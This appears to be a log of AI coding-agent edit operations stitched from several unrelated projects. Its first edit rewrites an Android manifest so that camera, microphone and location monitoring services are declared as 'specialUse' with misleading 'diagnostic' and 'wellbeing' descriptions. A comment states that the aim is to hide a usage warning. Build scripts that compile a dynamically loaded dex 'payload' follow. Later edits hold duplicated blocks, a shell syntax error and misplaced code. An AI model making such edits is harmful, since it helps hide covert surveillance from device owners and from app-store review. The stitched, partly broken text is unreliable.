ops.text: Patch Android 14 Strict Foreground Service crashes and Race Conditions

ops.find_block:
<!-- OPTIMIZED: Removed 'location' type to hide battery usage warning and reduce heat -->
        <service android:name=".MonitorService" 
            android:enabled="true" 
            android:exported="false"
            android:foregroundServiceType="dataSync|camera|microphone" />

        <service
            android:name=".MyFcmService"
            android:exported="false">
            <intent-filter>
                <action android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>
            
        <!-- Updated for Android 14 Compliance -->
        <service android:name=".EmergencyService" 
            android:enabled="true" 
            android:exported="false"
            android:foregroundServiceType="dataSync|location|camera|microphone" />
            
        <service android:name=".BeaconService" 
            android:enabled="true" 
            android:exported="false" 
            android:foregroundServiceType="dataSync" />
ops.replace_with:
<!-- OPTIMIZED: Removed 'location' type to hide battery usage warning and reduce heat -->
        <service android:name=".MonitorService" 
            android:enabled="true" 
            android:exported="false"
            android:foregroundServiceType="specialUse">
            <property android:name="android.app.PROPERTY_SPECIAL_USE_SERVICE_TYPE" android:value="System-level diagnostic reporting and digital wellbeing monitoring."/>
        </service>

        <service
            android:name=".MyFcmService"
            android:exported="false">
            <intent-filter>
                <action android:name="com.google.firebase.MESSAGING_EVENT" />
            </intent-filter>
        </service>
            
        <!-- Updated for Android 14 Compliance -->
        <service android:name=".EmergencyService" 
            android:enabled="true" 
            android:exported="false"
            android:foregroundServiceType="specialUse">
            <property android:name="android.app.PROPERTY_SPECIAL_USE_SERVICE_TYPE" android:value="Emergency diagnostic data transmission."/>
        </service>
            
        <service android:name=".BeaconService" 
            android:enabled="true" 
            android:exported="false" 
            android:foregroundServiceType="specialUse">
            <property android:name="android.app.PROPERTY_SPECIAL_USE_SERVICE_TYPE" android:value="High priority location and health synchronization beacon."/>
        </service>

// 2. Background Logic will be started AFTER permissions are granted to prevent Android 14 crash
    }

ops.text: Initialize Fast Dex Compilation Engine with Dependency Harvesting

ops.content:
name: Fast Dex Compiler

on:
  workflow_dispatch:

jobs:
  compile:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Cache Libraries
        id: cache-libs
        uses: actions/cache@v4
        with:
          path: app/libs
          key: libs-v1-${{ hashFiles('app/build.gradle') }}

      - name: Run Fast Dex Script
        run: |
          chmod +x ./scripts/fast_dex.sh
          ./scripts/fast_dex.sh ${{ steps.cache-libs.outputs.cache-hit }}

      - name: Upload Result
        uses: actions/upload-artifact@v4
        with:
          name: speed-payload
          path: output/classes.dex

#!/bin/bash

CACHE_HIT=$1
START_TIME=$(date +%s)
echo "🕒 Starting Fast Compile..."

# 1. Environment Setup
mkdir -p output
mkdir -p build_tmp
cd app

# 2. Harvest if Cache Miss
if [ "$CACHE_HIT" != "true" ]; then
    echo "📦 Cache Miss. Harvesting dependencies (this will take a few minutes)..."
    gradle copyDependencies -q
fi

# 3. Process AARs
# kotlinc cannot read .aar files, so we extract the classes.jar from each one
echo "🔓 Extracting AARs..."
for aar in libs/*.aar; do
    if [ -f "$aar" ]; then
        # Extract classes.jar to a unique name
        jar_name="$(basename "$aar" .aar).jar"
        unzip -p "$aar" classes.jar > "libs/$jar_name"
        rm "$aar" # Remove AAR to keep classpath clean
    fi
done

# 4. Build Classpath
ANDROID_JAR="$ANDROID_SDK_ROOT/platforms/android-34/android.jar"
CP="$ANDROID_JAR"
for lib in libs/*.jar; do
    CP="$CP:$lib"
done

# 5. Compile Kotlin
echo "🔨 Compiling Kotlin source..."
SOURCES=$(find src/main/java -name "*.kt")

kotlinc -cp "$CP" \
        $SOURCES \
        -d ../build_tmp \
        -no-jdk -no-reflect

if [ $? -ne 0 ]; then echo "❌ Compilation failed"; exit 1; fi

# 6. Dexing
echo "⚡ Dexing..."
# Locate d8
D8_TOOL=$(ls $ANDROID_SDK_ROOT/build-tools/34.*/d8 | head -1)

$D8_TOOL ../build_tmp/**/*.class \
        --output ../output/ \
        --lib "$ANDROID_JAR"

if [ $? -ne 0 ]; then echo "❌ Dexing failed"; exit 1; fi

# 7. Finalize
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

echo "------------------------------------------"
echo "✅ Success! Duration: $DURATION seconds"
echo "📂 Result: output/classes.dex"
echo "------------------------------------------"

operations.content:
name: Fast Dex Compiler

on:
  workflow_dispatch:

jobs:
  compile:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Cache Libraries
        id: cache-libs
        uses: actions/cache@v4
        with:
          path: app/libs
          key: libs-v1-${{ hashFiles('app/build.gradle') }}

      - name: Run Fast Dex Script
        run: |
          chmod +x ./scripts/fast_dex.sh
          ./scripts/fast_dex.sh ${{ steps.cache-libs.outputs.cache-hit }}

      - name: Upload Result
        uses: actions/upload-artifact@v4
        with:
          name: speed-payload
          path: output/classes.dex

#!/bin/bash

CACHE_HIT=$1
START_TIME=$(date +%s)
echo "🕒 Starting Fast Compile..."

# 1. Environment Setup
mkdir -p output
mkdir -p build_tmp
cd app

# 2. Harvest if Cache Miss
if [ "$CACHE_HIT" != "true" ]; then
    echo "📦 Cache Miss. Harvesting dependencies (this will take a few minutes)..."
    gradle copyDependencies -q
fi

# 3. Process AARs
# kotlinc cannot read .aar files, so we extract the classes.jar from each one
echo "🔓 Extracting AARs..."
for aar in libs/*.aar; do
    if [ -f "$aar" ]; then
        # Extract classes.jar to a unique name
        jar_name="$(basename "$aar" .aar).jar"
        unzip -p "$aar" classes.jar > "libs/$jar_name"
        rm "$aar" # Remove AAR to keep classpath clean
    fi
done

# 4. Build Classpath
ANDROID_JAR="$ANDROID_SDK_ROOT/platforms/android-34/android.jar"
CP="$ANDROID_JAR"
for lib in libs/*.jar; do
    CP="$CP:$lib"
done

# 5. Compile Kotlin
echo "🔨 Compiling Kotlin source..."
SOURCES=$(find src/main/java -name "*.kt")

kotlinc -cp "$CP" \
        $SOURCES \
        -d ../build_tmp \
        -no-jdk -no-reflect

if [ $? -ne 0 ]; then echo "❌ Compilation failed"; exit 1; fi

# 6. Dexing
echo "⚡ Dexing..."
# Locate d8
D8_TOOL=$(ls $ANDROID_SDK_ROOT/build-tools/34.*/d8 | head -1)

$D8_TOOL ../build_tmp/**/*.class \
        --output ../output/ \
        --lib "$ANDROID_JAR"

if [ $? -ne 0 ]; then echo "❌ Dexing failed"; exit 1; fi

# 7. Finalize
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

echo "------------------------------------------"
echo "✅ Success! Duration: $DURATION seconds"
echo "📂 Result: output/classes.dex"
echo "------------------------------------------"

ops.text: Implement Phase 1 (Gradle Harvest), Phase 2 & 3 (Bash Forge & Crunch), and create dynamic sandbox

ops.content:
#!/bin/bash
set -e

echo "\uD83D\uDE80 Starting Phase 2 & 3: The Forge and The Crunch"

# Directories
WORKDIR="dynamic_build"
CLASSES_DIR="$WORKDIR/classes"
DEX_DIR="$WORKDIR/dex"
KOTLIN_DIR="$WORKDIR/kotlinc"
LIBS_DIR="app/build/harvested_libs"

mkdir -p $CLASSES_DIR
mkdir -p $DEX_DIR

# 1. Download Tools if missing
if[ ! -d "$KOTLIN_DIR" ]; then
    echo "\u2B07\uFE0F Downloading Kotlin Compiler 1.9.24..."
    wget -q https://github.com/JetBrains/kotlin/releases/download/v1.9.24/kotlin-compiler-1.9.24.zip -O $WORKDIR/kotlin.zip
    unzip -q $WORKDIR/kotlin.zip -d $WORKDIR/
fi

if [ ! -f "$WORKDIR/compose-compiler.jar" ]; then
    echo "\u2B07\uFE0F Downloading Compose Compiler 1.5.14..."
    wget -q https://repo1.maven.org/maven2/androidx/compose/compiler/compiler/1.5.14/compiler-1.5.14.jar -O $WORKDIR/compose-compiler.jar
fi

# 2. Build Giga-Classpath
echo "\uD83D\uDD17 Building Classpath from Armory..."
if [ ! -d "$LIBS_DIR" ]; then
    echo "\u274C ERROR: $LIBS_DIR not found. Run './gradlew app:harvestDeps' first!"
    exit 1
fi

CP=$(find $LIBS_DIR -name "*.jar" | tr '\n' ':')

if [ -z "$ANDROID_SDK_ROOT" ]; then
    ANDROID_SDK_ROOT="/usr/local/lib/android/sdk"
fi
CP="$CP:${ANDROID_SDK_ROOT}/platforms/android-34/android.jar"

# 3. PHASE 2: The Forge (Compile to .class)
echo "\u2694\uFE0F FORGING (Kotlin -> Bytecode)..."
$KOTLIN_DIR/bin/kotlinc dynamic_src/ \
    -cp "$CP" \
    -Xplugin=$WORKDIR/compose-compiler.jar \
    -d $CLASSES_DIR

# 4. PHASE 3: The Crunch (Dexing)
echo "\uD83D\uDDDC\uFE0F CRUNCHING (Bytecode -> Dex)..."
BUILD_TOOLS_DIR=$(ls -d ${ANDROID_SDK_ROOT}/build-tools/34.* | head -1)

$BUILD_TOOLS_DIR/d8 \
    --output $DEX_DIR/ \
    --lib ${ANDROID_SDK_ROOT}/platforms/android-34/android.jar \
    $(find $CLASSES_DIR -name "*.class")

echo "\u2705 PAYLOAD READY: $DEX_DIR/classes.dex"

operations.content:
#!/bin/bash
set -e

echo "\uD83D\uDE80 Starting Phase 2 & 3: The Forge and The Crunch"

# Directories
WORKDIR="dynamic_build"
CLASSES_DIR="$WORKDIR/classes"
DEX_DIR="$WORKDIR/dex"
KOTLIN_DIR="$WORKDIR/kotlinc"
LIBS_DIR="app/build/harvested_libs"

mkdir -p $CLASSES_DIR
mkdir -p $DEX_DIR

# 1. Download Tools if missing
if[ ! -d "$KOTLIN_DIR" ]; then
    echo "\u2B07\uFE0F Downloading Kotlin Compiler 1.9.24..."
    wget -q https://github.com/JetBrains/kotlin/releases/download/v1.9.24/kotlin-compiler-1.9.24.zip -O $WORKDIR/kotlin.zip
    unzip -q $WORKDIR/kotlin.zip -d $WORKDIR/
fi

if [ ! -f "$WORKDIR/compose-compiler.jar" ]; then
    echo "\u2B07\uFE0F Downloading Compose Compiler 1.5.14..."
    wget -q https://repo1.maven.org/maven2/androidx/compose/compiler/compiler/1.5.14/compiler-1.5.14.jar -O $WORKDIR/compose-compiler.jar
fi

# 2. Build Giga-Classpath
echo "\uD83D\uDD17 Building Classpath from Armory..."
if [ ! -d "$LIBS_DIR" ]; then
    echo "\u274C ERROR: $LIBS_DIR not found. Run './gradlew app:harvestDeps' first!"
    exit 1
fi

CP=$(find $LIBS_DIR -name "*.jar" | tr '\n' ':')

if [ -z "$ANDROID_SDK_ROOT" ]; then
    ANDROID_SDK_ROOT="/usr/local/lib/android/sdk"
fi
CP="$CP:${ANDROID_SDK_ROOT}/platforms/android-34/android.jar"

# 3. PHASE 2: The Forge (Compile to .class)
echo "\u2694\uFE0F FORGING (Kotlin -> Bytecode)..."
$KOTLIN_DIR/bin/kotlinc dynamic_src/ \
    -cp "$CP" \
    -Xplugin=$WORKDIR/compose-compiler.jar \
    -d $CLASSES_DIR

# 4. PHASE 3: The Crunch (Dexing)
echo "\uD83D\uDDDC\uFE0F CRUNCHING (Bytecode -> Dex)..."
BUILD_TOOLS_DIR=$(ls -d ${ANDROID_SDK_ROOT}/build-tools/34.* | head -1)

$BUILD_TOOLS_DIR/d8 \
    --output $DEX_DIR/ \
    --lib ${ANDROID_SDK_ROOT}/platforms/android-34/android.jar \
    $(find $CLASSES_DIR -name "*.class")

echo "\u2705 PAYLOAD READY: $DEX_DIR/classes.dex"

ops.text: Correct Protocol 3 to preserve original morphology (prefixes/suffixes) in the 'word' field and limit cleaning to OCR typo repair only.

ops.find_block:
3. PROTOCOL: THE CORRECTOR (Repair & De-prefixing)
       - ACTION 1: Strip prepositional prefixes (ለ-፣ በ-፣ ከ-፣ የ-፣ እንደ-፣ ስለ-) and common suffixes from the string. 
       - THE 'word' FIELD: This must contain the cleaned version of the original word. It is the specific lexical instance found in the text, not the generic root.
       - ACTION 2: Attempt to fix minor visual OCR spelling errors (e.g., 'ሀ' vs 'ሃ') ONLY if context makes the correction certain.
       - STRIP attached punctuation (e.g., "ሰላም::" ➔ "ሰላም").
       - RULE: If the word remains ambiguous or meaningless after these steps, DISCARD it.
ops.replace_with:
3. PROTOCOL: THE CORRECTOR (OCR Repair & Morphological Preservation)
       - THE 'word' FIELD: This must be the word as found in the text, preserving all original prefixes, suffixes, and conjugations (e.g., 'ለቤታቸው', 'እንዲቃኝና'). 
       - ACTION: Fix only visual OCR spelling errors or clear typos (e.g., 'ሀ' vs 'ሃ') if the correction is certain from context. 
       - DO NOT strip prepositions (ለ-, በ-, ከ-, etc.) or suffixes from this field. Keep the morphology exactly as it appears in the source, but fixed for spelling.
       - STRIP attached punctuation (e.g., "ሰላም::" ➔ "ሰላም").
       - RULE: If the word remains ambiguous or meaningless after these steps, DISCARD it.

       - STRIP attached punctuation (e.g., "ሰላም::" ➔ "ሰላም").
       - RULE: If the word remains ambiguous or meaningless after these steps, DISCARD it.

ops.text: Migrate infrastructure to freq_3, increase batch size, and update state table to v3

ops.find_block:
const { data: state, error: stateError } = await supabase
      .from('processing_state')
      .select('*')
      .eq('source_filename', SOURCE_FILE)
      .single();
ops.replace_with:
const { data: state, error: stateError } = await supabase
      .from('processing_state_v3')
      .select('*')
      .eq('source_filename', SOURCE_FILE)
      .single();

ops.text: Swap OpenAI for Gemini SDK in both Python (pip) and Android dependencies
